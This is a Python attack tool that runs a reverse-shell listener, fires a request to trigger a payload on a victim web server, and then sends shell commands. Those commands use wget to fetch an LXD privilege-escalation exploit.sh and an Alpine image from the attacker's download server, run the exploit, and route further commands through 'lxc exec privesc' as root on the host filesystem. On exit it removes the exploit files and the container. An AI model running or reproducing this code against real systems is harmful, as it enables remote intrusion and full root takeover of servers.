import socket, sys, time, os, requests, datetime, re, random, errno
import threading

def listen(ip,port, t2, r_port, file_name):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	print("Listening on port " + str(port))
	con = None
	conn, addr = s.accept()
	print('Connection received from ',addr)
	print('=================================================')
	print('=                Reverse Shell                  =')
	print('=================================================')
	print('$', end=" ") # The shell does not print the first $, so in order not to confuse the user I decided to print it
	try:
		
		t2.start() # This threads will be daemon, however they will close once the main thread closes, so we don't run into the problem of keeping it always on
		print('[+] Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
		print('[+] Waiting for connection')
		time.sleep(0.5)
		commands = ['cd /srv/www/wordpress\n', 'wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami\n'] #'rm -f {r_port}_file.tar.gz exploit.sh\n'.format(r_port=r_port)]
		for cmd in commands:
			ans = recvall(conn)
			sys.stdout.write(ans)
			conn.send(cmd.encode())
			time.sleep(0.2)
			sys.stdout.write("\033[A" + ans.split("\n")[-1])
		print('''
		
		################################################################
		#							       #
		#                       Explanation			       #
		#							       #
		################################################################
		
		In order to have the concept of session, make compound commands.
		Example, if you wanted to list the contents of /tmp
		cd /tmp && ls -la
		
		Otherwise if you type:
		cd /tmp
		ls -la
		
		It will list the contents of directory you were when executing cd /tmp
		''')
		
		while True:
			#Receive data from the target and get user input

			ans = recvall(conn)
			sys.stdout.write(ans)
			command = input()

			# Send command with 'lxc exec privesc -- sh -c "cd /mnt/root"', in order to execute the command inside the container
			# cd /mnt/root is always forced because the filesystem was mounted at this point, that way the user will always be poiting to the root
			# Since we between commands we lose the concept of session, its always force so we can start from the exact same point
			
			
			if command != "":
				command = "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + command + "\""
			command += '\n'
			conn.send(command.encode())
			time.sleep(0.4)
			sys.stdout.write("\033[A" + ans.split("\n")[-1])
			print("")
	except KeyboardInterrupt:
		if conn:
			print('\n[-] Unbinding...')
			# Cleanup
			conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force'.encode())
			time.sleep(0.2)
			conn.close()
			s.close()
	conn.close()
        
def listen_shell(ip, port, v_ip, v_port):
	r_port = random.randint(1024, 65536)
	# Making sure the random port is not in use
	while check_port(ip, r_port):
		r_port = random.randint(1024, 65536)
		
	t1 = threading.Thread(target=task, args=(v_ip, v_port))
	t2 = threading.Thread(target=task2, args=(ip, r_port))
	t1.start()
	listen(ip, int(port), t2, r_port, get_file_name())
	
def task(v_ip, v_port):

	time.sleep(1)
	now = datetime.datetime.now()
	print('[*] Executing Thread for HTTP Request')
	if os.path.exists('./tmp_file_with_dest_url.txt'):
		f = open('./tmp_file_with_dest_url.txt', 'r')
		url = 'http://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
		print('[*] Making request to execute reverse shell ', url)
		# Make the timeout very low in order not to wait for response
		# Make the exception pass so that the user does not get an error 
		try:
	    		requests.get(url, timeout=(1, 1))
		except requests.exceptions.ReadTimeout:
	    		pass
		except requests.exceptions.ConnectTimeout:
	    		sys.exit('[-] We couldn\'t find the exploit in the victim server, check if the server is alive')
	    		 
		os.remove('./tmp_file_with_dest_url.txt')
		print('[*] The exact time before lauching the exploit was: ', now)
		print('[*] You can use this time to help you filter the syscall logs')
		

	else:
		print('[-] URL wasn\'t generated, you might need to run the exploit another time')
		print('[-] If the problem persists, please confirm the information you passed')
		
		sys.exit()
		
# This will invoke the a server to download files, used to pass both the exploit and the tar.gz file
def task2(ip, r_port):
	os.system('python3 ./Privilege_Escalation_LXD/file_download_server.py {r_port}'.format(r_port=r_port))
	
def check_port(ip, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((ip, port))
	except socket.error as e:
		if e.errno == errno.EADDRINUSE:
			return True
		else:
			# something else raised the socket.error exception
			print(e)
			sys.exit()
	return False

	s.close()
	
def get_file_name():
	files = os.listdir(os.curdir)
	for file in files:
		# search given pattern in the line 
		match = re.search('alpine-.*\.tar\.gz$', file)
		  
		# if match is found
		if match:
			return file
			
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = ''
    while True:
        part = sock.recv(BUFF_SIZE).decode()
        data += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return data

